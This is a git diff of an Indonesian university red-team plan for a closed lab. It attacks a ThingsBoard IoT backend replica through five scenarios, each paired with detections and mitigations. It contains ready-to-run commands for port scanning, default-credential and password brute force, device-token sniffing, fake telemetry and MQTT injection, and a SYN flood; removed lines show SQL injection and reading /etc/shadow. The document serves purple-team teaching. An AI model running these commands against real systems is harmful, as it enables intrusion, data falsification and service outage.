@@ -1,12 +1,13 @@
-# Red Team Attack Plan — Fase 2 (Minggu 10–11)
+# Red Team Attack Plan — Fase 2 (Minggu 10–11) · Backend KABITA
 
-**Kelompok 4 · TEK1314 Kelas A · Target Node replika:** `192.168.4.5` (Ubuntu Server LTS 26.04)
+**Kelompok 4 · TEK1314 Kelas A**
+**Target Node:** `192.168.4.5` (Ubuntu Server 26.04 + **ThingsBoard CE** + PostgreSQL)
 **Attacker Node:** `192.168.4.100` (Kali Linux) · **Monitoring:** `192.168.4.200` (Security Onion)
 **Penyusun:** Red Team — Raka Syauqi Ferdian (J0404241112), Zidan
 
-Dokumen ini memenuhi Bagian IX panduan: **≥3 skenario, ≥2 kategori berbeda**, DoS maksimal
-satu skenario, tools disebut eksplisit sejak tahap rencana, dan setiap skenario dikaitkan
-dengan celah nyata hasil riset Minggu 4.
+Dokumen ini memenuhi Bagian IX panduan: **5 skenario, 4 kategori berbeda**, DoS maksimal satu
+skenario, tools disebut eksplisit sejak rencana, dan setiap skenario menyasar celah yang benar-
+benar ada pada replika backend KABITA (`docs/design/replica_setup.md` Bagian 4).
 
 ## 0. Rules of Engagement
 
@@ -14,189 +15,183 @@ dengan celah nyata hasil riset Minggu 4.
 |---|---|
 | Cakupan | Hanya `192.168.4.0/24` di jaringan lab tertutup. **Tidak ada** scanning/eksploitasi ke sistem Mitra atau internet. |
 | Izin | Lead mencatat persetujuan tertulis (commit/chat) sebelum eksekusi; snapshot VM diambil sebelum tiap sesi. |
-| Batas availability | DoS hanya RT-05, durasi ≤60 detik, satu service, satu IP. |
-| Data | Data hasil dump DB tidak berisi data pribadi nyata (data sintetis); screenshot disensor untuk NIM/password. |
-| Rollback | Snapshot `before-rt0X` dipulihkan setelah tiap skenario agar baseline hardening konsisten. |
-| Etika | Semua temuan dilaporkan ke Blue Team lewat `docs/purple-team-log.md`, bukan dipublikasikan. |
+| Batas availability | DoS hanya RT-05, durasi ≤60 detik, satu service (ThingsBoard :8080), satu IP. |
+| Data | Data telemetri sintetis (berat/pakan kambing fiktif); tidak ada data peternakan nyata. |
+| Rollback | Snapshot `before-rt0X` dipulihkan setelah tiap skenario. |
+| Etika | Semua temuan dilaporkan ke Blue Team lewat `docs/purple-team-log.md`. |
 
 ## 1. Ringkasan skenario
 
 | ID | Kategori (Bagian IX) | Teknik | Tools | Target | Ekspektasi hasil |
 |---|---|---|---|---|---|
-| RT-01 | Reconnaissance | Port/service scan + OS fingerprinting + enumerasi banner | `nmap`, `whatweb`, Wireshark | `192.168.4.5` | Peta port lengkap; identifikasi nginx, MariaDB, Mosquitto, OpenSSH sebagai kandidat |
-| RT-02 | Exploitation / Akses | Brute-force kredensial lemah → login SSH → eskalasi sudo | `hydra`, Metasploit (`auxiliary/scanner/ssh/ssh_login`) | `192.168.4.5:22` (→ `:2222` setelah A-3) | Login sebagai `iotadmin`, `sudo -l` penuh → kompromi server backend |
-| RT-03 | Web/API/Protokol IoT | SQL injection pada endpoint data sensor (dashboard DVWA) | sqlmap, Burp Suite | `http://192.168.4.5/iot-dashboard/`, `:80` | Dump tabel `users` + `sensor_readings` → kebocoran data operasional |
-| RT-04 | Web/API/Protokol IoT | MQTT topic hijack / spoof publish ke topik aktuator (kondisional, butuh broker 1883) | mosquitto_pub, MQTT Explorer | `192.168.4.5:1883` | Perintah palsu "pompa ON" diterima broker tanpa autentikasi |
-| RT-05 | Availability (maks. 1) | SYN flood sederhana pada layanan web | hping3 | `192.168.4.5:80` | Dashboard tidak dapat diakses selama serangan |
+| RT-01 | Reconnaissance | Port/service scan, fingerprint ThingsBoard, enumerasi MQTT | `nmap`, `whatweb`, `nmap --script mqtt-subscribe` | `192.168.4.5` | Peta port 8080/1883/5432/22; versi ThingsBoard & PostgreSQL teridentifikasi |
+| RT-02 | Exploitation / Akses | Login kredensial default ThingsBoard + brute-force SSH | Burp Intruder, `hydra`, Metasploit `ssh_login` | `192.168.4.5:8080`, `:22` | Masuk sebagai tenant admin (melihat semua device) atau sebagai `iotadmin` (root server) |
+| RT-03 | Web/API | Pencurian device access token → injeksi telemetri palsu via REST | Burp Suite, `curl`, `ffuf` | `http://192.168.4.5:8080` | Data `berat_kg`/`pakan_kg` palsu masuk ke dashboard KABITA |
+| RT-04 | Web/API/Protokol IoT | MQTT spoof publish memakai token device (tanpa TLS) | `mosquitto_pub`, MQTT Explorer | `192.168.4.5:1883` | Telemetri/aktuator palsu diterima broker ThingsBoard |
+| RT-05 | Availability (maks. 1) | SYN flood terkontrol pada dashboard | `hping3` | `192.168.4.5:8080` | Dashboard KABITA tidak dapat diakses ≤60 detik |
 
-Kategori terpakai: **4 dari 5** (Recon, Exploitation, Web/API/IoT, Availability). Sesuai
-ketentuan, Availability hanya 1 dari 5.
+Kategori terpakai: **4 dari 5** (Recon, Exploitation, Web/API, Availability), dengan IoT-protocol
+di dalam kategori Web/API/Protokol IoT. Availability hanya 1 dari 5.
 
-> **Revisi Minggu 9:** Target Node kini **Ubuntu Server LTS 26.04** (bukan Metasploitable2) agar
-> replika menyerupai backend IoT dan `ufw`/`fail2ban`/`apt` berfungsi. Kelemahan yang diuji
-dipasang sengaja — daftarnya di `docs/design/replica_setup.md` Bagian 3.
+## 2. RT-01 · Reconnaissance
 
-## 2. RT-01 · Reconnaissance (pemetaan permukaan serangan)
-
-**Kaitan riset Minggu 4 + setup replika:** target membuka 22 (OpenSSH), 80 (nginx + PHP +
-DVWA), 3306 (MariaDB), 1883 (Mosquitto). Celahnya bukan versi usang, melainkan konfigurasi yang
-sengaja dibuat lemah (kredensial, SQLi, MQTT tanpa auth) — rincian di `docs/design/replica_setup.md`.
+**Sasaran:** memetakan backend KABITA. ThingsBoard mengekspos UI + REST (8080), MQTT (1883),
+CoAP (5683/udp, bila aktif), PostgreSQL (5432), SSH (22).
 
 ```bash
-# 1. host discovery + full TCP scan + versi + OS fingerprint
+mkdir -p ~/rt01 && cd ~/rt01
+# 1. host discovery + full TCP
 nmap -sS -p- -T4 --min-rate 1000 192.168.4.5 -oA rt01_fulltcp
-nmap -sV -sC -O --osscan-guess -p21,22,23,25,80,139,445,3306,5432,8180 192.168.4.5 -oA rt01_services
-# 2. enumerasi banner web & user
-whatweb -a 3 http://192.168.4.5/
-nmap --script http-enum,ftp-anon,mysql-info -p21,80,3306 192.168.4.5
-# 3. tangkap trafik scan untuk validasi deteksi
+# 2. versi + script default pada port yang relevan
+nmap -sV -sC -p22,1883,5432,8080,5683 192.168.4.5 -oA rt01_services
+# 3. fingerprint web (ThingsBoard punya halaman login khas)
+whatweb -a 3 http://192.168.4.5:8080/
+curl -s http://192.168.4.5:8080/api/noauth/activateByEmail | head -c 200
+# 4. enumerasi MQTT (cek apakah CONNECT anonim ditolak)
+nmap --script mqtt-subscribe -p1883 192.168.4.5
+# 5. tangkap trafik scan untuk validasi deteksi
 sudo tcpdump -i eth0 -w rt01_scan.pcap host 192.168.4.5
 ```
 
-**Hasil yang diharapkan:** 20+ port terbuka; versi service teridentifikasi; OS Linux 2.6
-(Ubuntu 8.04) terdeteksi dari TTL/tcp fingerprint.
-**Deteksi yang diharapkan Blue Team:** alert "port scan" dari Zeek (`Notice::Port_Scan`) /
-Suricata ET SCAN; lonjakan koneksi SYN ke banyak port dalam <60 detik.
-**Mitigasi yang akan diuji (checklist):** B-1, B-2 (pengurangan port terbuka & filtered).
+**Hasil yang diharapkan:** 4 port terbuka (22, 1883, 5432, 8080); banner/HTTP title
+menunjukkan ThingsBoard; MQTT menolak CONNECT tanpa token (bukti token memang dipakai).
+**Deteksi (Blue):** Zeek `Notice::Port_Scan`, Suricata ET SCAN, `nmap` NSE terlihat di `conn.log`.
+**Mitigasi yang diuji:** B-1, B-2.
 
-## 3. RT-02 · Exploitation — kredensial lemah & eskalasi di server backend
+## 3. RT-02 · Exploitation — kredensial default ThingsBoard & SSH lemah
 
-**Kaitan riset Minggu 4:** target menjalankan SSH dengan autentikasi password dan user
-manajemen `iotadmin` dengan password lemah (kelemahan disengaja #1, lihat
-`docs/design/replica_setup.md`). Ini merepresentasikan kesalahan paling umum di backend IoT
-nyata: kredensial default/lemah pada layanan manajemen, bukan exploit eksotis.
+**Celah nyata:** banyak instalasi ThingsBoard dibiarkan memakai akun demo
+(`tenant@thingsboard.org`/`tenant`, `sysadmin@thingsboard.org`/`sysadmin`), dan server-nya
+memakai password SSH lemah.
 
 ```bash
-# 1. brute-force SSH dengan wordlist (skala lab, terbatas)
+# 1. uji kredensial default di UI/REST ThingsBoard
+curl -s -X POST http://192.168.4.5:8080/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"tenant@thingsboard.org","password":"tenant"}' | head -c 400
+
+# 2. brute-force formulir login dengan Burp Intruder / ffuf
+ffuf -u http://192.168.4.5:8080/api/auth/login -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"tenant@thingsboard.org","password":"FUZZ"}' \
+  -w /usr/share/wordlists/rockyou.txt -mc 200 -mr '"token"'
+
+# 3. brute-force SSH server (skala lab, terbatas)
 hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f -V
-# catatan: setelah A-3 diterapkan, port = 2222 -> tambahkan -s 2222
 
-# 2. bila kredensial ditemukan, masuk dan ukur dampak
-ssh iotadmin@192.168.4.5
-id; hostname; uname -a
-sudo -l                      # harapan: user punya sudo -> eskalasi ke root
-sudo cat /etc/shadow | head -3
-mysql -u iotadmin -p iot_db -e "SELECT * FROM sensor_readings LIMIT 5;"
-# alternatif Metasploit
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.4.5; \
-  set USERNAME iotadmin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
+# 4. ukur dampak bila SSH berhasil
+ssh iotadmin@192.168.4.5 'id; hostname; sudo -n -l | head'
 ```
 
-**Hasil yang diharapkan:** login berhasil sebagai `iotadmin`, `sudo -l` menunjukkan hak sudo
-penuh → penyerang menguasai server backend (bisa mengubah data sensor, mematikan layanan, dan
-memalsukan perintah aktuator).
-**Deteksi yang diharapkan:** `auth.log` berisi `Failed password` berulang diikuti
-`Accepted password`; Zeek `conn.log` menunjukkan banyak koneksi singkat ke port 22/2222;
-Suricata ET SCAN/brute-force (bila rule aktif).
-**Mitigasi yang akan diuji:** A-2 (key-only), A-4 (fail2ban), B-3 (password kuat), A-1
-(no root login).
-**Tahap 5 (verifikasi):** ulangi hydra → ditolak/ter-ban; login password gagal; `sudo -l` tidak
-lagi memberi hak penuh (user tidak masuk grup sudo).
+**Hasil yang diharapkan:** (a) token JWT tenant admin didapat → seluruh device & telemetri
+kambing dapat dibaca/diubah; atau (b) login SSH `iotadmin` + sudo penuh → server backend dikuasai.
+**Deteksi (Blue):** `auth.log` (`Failed password` berulang → `Accepted password`), Zeek `conn.log`
+banyak koneksi singkat ke 22, log aplikasi ThingsBoard `Failed authentication`.
+**Mitigasi yang diuji:** A-1, A-2, A-4, B-3 (+ wajib ganti akun default ThingsBoard).
+**Tahap 5:** ulangi → akun default sudah diganti (401), hydra ter-ban fail2ban.
 
-## 4. RT-03 · Web/API — SQL injection pada endpoint data sensor
+## 4. RT-03 · Web/API — pencurian device token & injeksi telemetri
 
-**Kaitan riset Minggu 4:** DVWA level *low* membiarkan parameter `id` masuk langsung ke query
-`SELECT first_name, last_name FROM users WHERE user_id = '$id'`. Di replika, query yang sama
-dipakai endpoint `api/sensor` pada dashboard monitoring.
+**Celah nyata:** device access token dipakai sebagai satu-satunya kredensial perangkat dan
+sering bocor (dashboard publik, URL API, log, tangkapan layar). Tanpa TLS, token terlihat di
+jaringan. Setelah token didapat, penyerang dapat menulis telemetri palsu — pada KABITA artinya
+**berat badan dan pakan kambing bisa dipalsukan**.
 
 ```bash
-# 1. konfirmasi manual
-curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1'&Submit=Submit"      # error SQL
-curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
-# 2. otomatisasi dump
-sqlmap -u "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=<sesi-valid>; security=low" --batch --dbs --dump -T users
-sqlmap -u "http://192.168.4.5/pbl/api.php?id=1" --batch --technique=BEU --level=3 --risk=2
-# 3. alternatif GUI (bukti untuk slide)
-burpsuite  # Repeater: modifikasi id=1 -> id=1 UNION SELECT user,password FROM users
+# 1. temukan token: dashboard publik / API tanpa auth / sniffing
+curl -s http://192.168.4.5:8080/api/noauth/dashboard | head -c 300
+ffuf -u http://192.168.4.5:8080/api/v1/FUZZ/telemetry -w tokens.txt -mc 200
+sudo tcpdump -i eth0 -A -s0 'tcp port 8080 or tcp port 1883' | grep -i -m5 'token\|Bearer'
+
+# 2. injeksi telemetri palsu via REST
+TOKEN='<token-yang-didapat>'
+curl -s -X POST "http://192.168.4.5:8080/api/v1/$TOKEN/telemetry" \
+  -H 'Content-Type: application/json' \
+  -d '{"berat_kg":99.9,"pakan_kg":0.1,"rfid":"KMB-999"}'
+
+# 3. bukti di sisi aplikasi: dashboard menampilkan angka palsu
+curl -s "http://192.168.4.5:8080/api/plugins/telemetry/DEVICE/<deviceId>/values/timeseries?keys=berat_kg,pakan_kg" \
+  -H "X-Authorization: Bearer <jwt-tenant>"
 ```
 
-**Hasil yang diharapkan:** dump `users` (username + hash password) dan `sensor_readings`;
-setara "pencurian data operasional" yang menjadi ancaman utama pada skenario SOC.
-Hash kemudian diuji dengan `hashcat -m 0 hashes.txt rockyou.txt` untuk menunjukkan eskalasi.
-**Deteksi yang diharapkan:** Suricata ET WEB_SERVER SQL injection / generic SQLi pattern;
-Zeek `http.log` dengan URI mengandung `UNION`, `'`, `OR 1=1`; lonjakan respons error 500.
-**Mitigasi yang akan diuji:** C-2 (prepared statement), C-3 (least privilege DB), B-2 (batasi
-akses 3306 hanya dari monitoring).
-**Tahap 5 (verifikasi):** `sqlmap --batch` ulang → `parameter does not seem to be injectable`;
-payload manual menghasilkan respons normal, bukan error SQL.
+**Hasil yang diharapkan:** telemetri palsu tersimpan dan tampil di dashboard KABITA — data
+operasional peternakan tidak lagi dapat dipercaya (integritas data).
+**Deteksi (Blue):** Suricata rule kustom "POST /api/v1/*/telemetry dari IP non-gateway",
+Zeek `http.log` (URI berpola `/api/v1/`), anomali nilai telemetri (99,9 kg).
+**Mitigasi yang diuji:** C-2 (rotasi token + validasi input), B-2 (batasi akses 8080),
+A-2 (akun default diganti).
+**Tahap 5:** token lama ditolak (401), nilai palsu tidak diterima setelah validasi rentang.
 
-## 5. RT-04 · MQTT topic hijack / spoof publish (Web/API/Protokol IoT)
+## 5. RT-04 · MQTT spoof publish (Web/API/Protokol IoT)
 
-**Kaitan riset Minggu 4:** replika belum punya broker MQTT; protokol inilah yang membuat
-skenario benar-benar IoT. Pada Fase 2 dipasang Mosquitto di `192.168.4.5:1883` dengan
-konfigurasi awal **tanpa autentikasi** (meniru kesalahan umum gateway IoT), lalu diuji.
+**Celah nyata:** transport MQTT ThingsBoard tanpa TLS; token perangkat dikirim sebagai
+username dengan password kosong sehingga mudah disadap di segmen yang sama.
 
 ```bash
-# instalasi replika (dijalankan Blue Team sebelum skenario)
-sudo apt-get install -y mosquitto mosquitto-clients
-# konfigurasi awal sengaja permisif: allow_anonymous true
+# 1. siapkan token (hasil RT-03 atau dari snapshot konfigurasi)
+TOKEN='<token-device>'
 
-# redshift: dengarkan seluruh topik
-mosquitto_sub -h 192.168.4.5 -t '#' -v
-# spoofing perintah aktuator (pompa ON palsu)
-mosquitto_pub -h 192.168.4.5 -t 'aktuator/pompa' -m '{"cmd":"ON","src":"attacker"}'
-# injeksi data sensor palsu (memanipulasi pembacaan dashboard)
-mosquitto_pub -h 192.168.4.5 -t 'sensor/soil/data' -m '{"moisture":99,"ts":"2026-10-20T10:00:00Z"}'
+# 2. dengarkan telemetri (bila ACL longgar)
+mosquitto_sub -h 192.168.4.5 -p 1883 -u "$TOKEN" -P '' -t 'v1/devices/me/telemetry' -v
+
+# 3. kirim telemetri palsu jalur MQTT
+mosquitto_pub -h 192.168.4.5 -p 1883 -u "$TOKEN" -P '' \
+  -t v1/devices/me/telemetry -m '{"berat_kg":12.0,"pakan_kg":9.9,"rfid":"KMB-001"}'
+
+# 4. MQTT Explorer sebagai bukti visual topik v1/devices/me/*
 ```
 
-**Hasil yang diharapkan:** broker menerima publish tanpa kredensial; dashboard menampilkan
-nilai sensor palsu dan aktuator berubah status → bukti bahwa "perintah fisik" dapat dipalsukan
-tanpa menyentuh jaringan sensor.
-**Deteksi yang diharapkan:** belum ada signature MQTT bawaan di Security Onion → Blue Team
-wajib membuat rule kustom: alert bila ada `CONNECT` dari IP selain gateway (`192.168.4.100`)
-atau `PUBLISH` ke `aktuator/#` dari luar service otomasi.
-**Mitigasi yang akan diuji:** C-2 (ACL topik + `allow_anonymous false`), A-2 (kredensial
-gateway), B-2 (ufw batasi 1883 hanya gateway).
-**Tahap 5 (verifikasi):** `mosquitto_pub` tanpa kredensial → `Connection Refused: not authorized`;
-dengan user gateway ke topik `aktuator/#` → `Not authorized`.
+**Hasil yang diharapkan:** broker menerima publish tanpa TLS dan dashboard menampilkan data
+palsu; penyerang tidak perlu menyentuh perangkat timbangan sama sekali.
+**Deteksi (Blue):** rule kustom MQTT — CONNECT dari IP selain gateway (`192.168.4.100` bukan
+gateway), atau publish `v1/devices/me/telemetry` berkali-kali dari satu sumber.
+**Mitigasi yang diuji:** C-2 (TLS + rotasi token), B-2 (ufw: 1883 hanya untuk gateway), A-2.
+**Tahap 5:** TLS wajib (`Connection refused` tanpa TLS) dan token lama ditolak.
 
 ## 6. RT-05 · Availability — SYN flood terkontrol (maks. 1 skenario)
 
 ```bash
-# 60 detik, satu service, satu target
-sudo timeout 60 hping3 -S --flood -V -p 80 192.168.4.5
-# pengukuran dampak dari host lain
-for i in $(seq 1 20); do curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://192.168.4.5/; sleep 1; done
+# 60 detik, satu service (ThingsBoard 8080), satu target
+sudo timeout 60 hping3 -S --flood -V -p 8080 192.168.4.5
+# pengukuran dampak
+for i in $(seq 1 20); do
+  curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://192.168.4.5:8080/login; sleep 1
+done
 ```
 
-**Hasil yang diharapkan:** respons dashboard melambat/timeout selama serangan; setelah 60 detik
-pulih (tidak ada kerusakan permanen).
-**Deteksi yang diharapkan:** Suricata ET DOS / SYN flood; Zeek `conn.log` menunjukkan ribuan
-koneksi `S0` (SYN tanpa ACK) dari satu sumber.
-**Mitigasi yang akan diuji:** rate limit `iptables -m limit` per source IP + `ufw limit 80/tcp`,
-serta `syncookies`.
-**Tahap 5 (verifikasi):** ulangi hping3 → paket di-drop, `curl` tetap 200 OK; alert rate-limit
-muncul di log.
+**Hasil yang diharapkan:** dashboard melambat/timeout ≤60 detik, pulih setelahnya.
+**Deteksi (Blue):** Suricata ET DOS, Zeek `conn.log` ribuan `S0` dari satu sumber.
+**Mitigasi yang diuji:** `ufw limit 8080/tcp`, `syncookies`, rate limit per IP.
+**Tahap 5:** ulangi → paket di-drop, `curl` tetap 200.
 
-## 7. Peta skenario → deteksi → kontrol mitigasi
+## 7. Peta skenario → deteksi → kontrol
 
-| Skenario | Kategori | Deteksi utama (Blue Team) | Kontrol penutup (checklist) |
+| Skenario | Kategori | Deteksi utama (Blue Team) | Kontrol penutup |
 |---|---|---|---|
-| RT-01 | Reconnaissance | Zeek `Port_Scan`, Suricata ET SCAN | B-1, B-2 |
-| RT-02 | Exploitation | `auth.log` (Failed → Accepted password berulang), Zeek `conn.log` | A-1, A-2, A-4, B-3 |
-| RT-03 | Web/API | ET WEB_SERVER SQLi, Zeek `http.log` (URI anomali) | C-2, C-3, B-2 |
-| RT-04 | Web/API/IoT | Rule kustom MQTT (publish dari IP non-gateway) | C-2, A-2, B-2 |
-| RT-05 | Availability | ET DOS SYN flood, Zeek `conn.log` (S0 tinggi) | ufw limit, syncookies |
+| RT-01 | Reconnaissance | Zeek `Port_Scan`, ET SCAN | B-1, B-2 |
+| RT-02 | Exploitation | `auth.log`, log auth ThingsBoard, Zeek `conn.log` | A-1, A-2, A-4, B-3 |
+| RT-03 | Web/API | Rule HTTP `POST /api/v1/*/telemetry`, anomali nilai telemetri | C-2, B-2 |
+| RT-04 | Web/API/IoT | Rule MQTT kustom (CONNECT non-gateway) | C-2, A-2, B-2 |
+| RT-05 | Availability | ET DOS SYN flood, Zeek `S0` tinggi | `ufw limit`, syncookies |
 
 ## 8. Rencana eksekusi Fase 2
 
 | Minggu | Aktivitas | PIC | Artefak |
 |---|---|---|---|
-| 10 (a) | Snapshot + baseline normal (`baseline_minggu9.pcap`) | Blue | `docs/blueteam/evidence/` |
-| 10 (b) | Pasang Mosquitto permisif, catat konfigurasi awal | Blue | `C2_before_*` |
+| 10 (a) | Snapshot + pasang ThingsBoard (replika KABITA), catat konfigurasi awal | Blue | `docs/design/replica_setup.md`, `C2_before_*` |
+| 10 (b) | Rekam baseline baru (dashboard + telemetri ThingsBoard) | Blue | `docs/blueteam/evidence/baseline/` |
 | 10 (c) | RT-01 + RT-02: eksekusi & rekam | Red | `docs/redteam/evidence/rt01/`, `rt02/` |
-| 10 (d) | Terapkan hardening A/B/C prioritas | Blue | file bukti after |
+| 10 (d) | Terapkan hardening prioritas (ganti akun default, ufw, token) | Blue | file bukti after |
 | 11 (a) | RT-03 + RT-04 + RT-05 pada kondisi hardening baru | Red | `rt03/`, `rt04/`, `rt05/` |
-| 11 (b) | Tahap 4–5 Purple Team Loop + tulis Vulnerability Assessment Report | Blue + Red | `docs/purple-team-log.md` |
+| 11 (b) | Tahap 4–5 Purple Team Loop + Vulnerability Assessment Report | Blue + Red | `docs/purple-team-log.md` |
 
-## 9. Format bukti per skenario (dipakai di `docs/redteam/evidence/<id>/`)
+## 9. Format bukti per skenario
 
 ```
-<id>_command.txt     # perintah persis yang dijalankan + timestamp
-<id>_output.txt      # output teks (nmap/sqlmap/msfconsole)
-<id>_screen.png      # tangkapan layar terminal
-<id>_alert.png       # tangkapan layar alert Security Onion (dari Blue Team)
-<id>_notes.md        # apa yang berhasil/gagal + catatan analisis
+docs/redteam/evidence/<id>/
+  <id>_command.txt   # perintah persis + timestamp
+  <id>_output.txt    # output teks (nmap/curl/hydra)
+  <id>_screen.png    # tangkapan layar terminal
+  <id>_alert.png     # alert Security Onion (dari Blue Team)
+  <id>_notes.md      # berhasil/gagal + analisis
 ```
-
